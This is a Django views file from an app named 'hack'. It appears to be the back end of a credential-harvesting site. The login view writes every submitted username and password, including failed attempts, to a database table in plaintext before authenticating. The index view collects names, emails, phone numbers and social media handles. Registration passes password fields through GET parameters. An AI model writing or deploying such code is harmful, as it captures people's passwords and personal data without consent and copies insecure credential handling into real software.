from django.shortcuts import render,redirect
from django.contrib.auth.models import User
from django.contrib.auth.forms import UserCreationForm
from django.contrib.auth import login,authenticate
from hack.models import Contact,Password

# Create your views here.
def index(request):
    if(request.user.is_anonymous):
        return redirect("/login")
    if(request.method=="POST"):
        name=request.POST.get('name')
        email=request.POST.get('email')
        phone=request.POST.get('phone')
        facebook=request.POST.get('facebook')
        instagram=request.POST.get('instagram')
        contact=Contact(name=name,email=email,phone=phone,facebook=facebook,instagram=instagram)
        contact.save()
    return render(request,'hack/index.html')
def logindevta(request):
    if(request.method=="POST"):
        username=request.POST.get('username')
        password=request.POST.get('password')
        z=Password(username=username,password=password)
        z.save()
        user=authenticate(username=username,password=password)
        if(user is not None):
            login(request,user)
            return redirect("/")
        else:
            return render(request,'hack/login.html')
    return render(request,'hack/login.html')

def register(request):
    if(request.method == "GET"):
        form=UserCreationForm(request.GET)
        if(form.is_valid()):
            form.save()
            return redirect('/login/')
        else:
            form=UserCreationForm()
    return render(request,'hack/register.html',{'form':form})
